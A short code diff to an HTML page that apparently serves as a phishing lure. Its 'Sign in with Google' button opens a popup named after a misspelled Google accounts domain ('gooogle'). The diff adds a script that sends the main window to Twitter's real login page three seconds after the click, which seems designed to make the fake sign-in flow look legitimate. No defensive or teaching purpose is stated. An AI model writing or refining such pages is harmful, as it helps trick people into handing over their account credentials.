@@ -45,7 +45,8 @@
                     <br>
                     <a href="accounts.gooogle.login.html" 
                         target="popup" 
-                        onclick="window.open('accounts.gooogle.login.html','popup','width=600,height=600'); return false;">
+                        onclick="window.open('accounts.gooogle.login.html', 'popup','width=600,height=600', buttonClick(),
+                        ); return false;">
                         <button type="button" class="login-with-google-btn" >
                             Sign in with Google
                         </button>
@@ -81,5 +82,11 @@
             </div>
         </div>
     </div>
-
+    <script>
+        function buttonClick() {
+            var timer = setTimeout(function() {
+            window.location='https://twitter.com/i/flow/login'
+        }, 3000);
+        }
+    </script>
 </html>
